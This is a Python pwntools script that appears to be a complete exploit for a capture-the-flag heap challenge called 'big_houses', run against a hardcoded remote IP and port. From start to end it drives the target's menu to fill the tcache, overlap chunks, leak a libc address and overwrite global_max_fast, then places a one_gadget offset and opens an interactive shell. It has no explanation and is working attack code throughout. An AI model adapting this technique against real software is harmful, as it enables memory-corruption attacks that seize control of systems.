from pwn import *
from time import sleep
period = 0.2
def new(size,data):
	p.sendline("1")
	#p.interactive()
	sleep(period)
	p.recvline()
	p.sendline(str(size))
	sleep(period)
	p.recvline()
	p.sendline(data)
	sleep(period)
	p.recv(8000)

def delete(idx):
	p.sendline("2")
	sleep(period)
	p.recvline()
	p.sendline(str(idx))
	sleep(period)
	p.recv(8000)

def view():
	p.sendline("3")
	sleep(period)
	data = p.recvuntil("1-")
	p.recvuntil("> ")
	return data[:-2]

def update(idx,data):
	p.sendline("4")
	sleep(period)
	p.recvuntil("item's spot:\n")
	p.sendline(str(idx))
	sleep(period)
	p.recvuntil("new name:\n")
	p.sendline(data)
	sleep(period)
	p.recvuntil("> ")

#p = process("./big_houses")
p = remote("54.84.43.211",7412)
p.recvuntil("> ")
p.sendline("1")
sleep(period)
p.recvuntil("> ")
for _ in range(7):
	new(0xf0,"A")
	delete(0)
print "done tcache"
new(18968*2-0x10,"aaaaaa")
#0xc30
new(0x308,"eee")
new(0xf8,"bbb")
new(0x128,"A"*(0x100-0x10) + p64(0) + p64(0x31))
new(0xc30*2-0x10,"ddd")
new(0x128,"ffff")
print "done news"
delete(2)
new(0xf8,"A"*0xf0 + p64(38496+0x200-0x20))

delete(0)
delete(3)
new(18968*2-0x10,"aa")
print "done before view"
data = view()
print "data:",data
leak = u64(data.split("1: ")[1].split("\n")[0].strip().ljust(8,"\x00"))
print "leak: ",hex(leak)
base = leak - 0x3ebca0
global_max = base + 0x3ed940
one_gadget = base + 0x4f3c2
print "global_max: ",hex(global_max)
#pause()
update(1,p64(leak) + p64(global_max - 0x10))
new(1280,"keklel")
update(4,"A"*((ord('u')-2)*8) + p64(one_gadget))
delete(0)
delete(4)
p.sendline("5")
p.sendline("2")
p.interactive()
